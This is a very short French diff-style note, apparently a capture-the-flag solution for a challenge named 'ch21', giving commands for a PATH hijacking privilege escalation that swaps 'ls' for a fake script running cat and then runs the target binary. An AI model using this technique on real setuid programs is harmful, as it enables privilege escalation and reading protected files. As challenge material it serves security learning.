@@ -1,0 +1,5 @@
+Modifier le ls en cat :
+vim /var/tmp/ls = #!/bin/cat 
+chmod +x /var/tmp/ls 
+PATH=/var/tmp
+./ch21
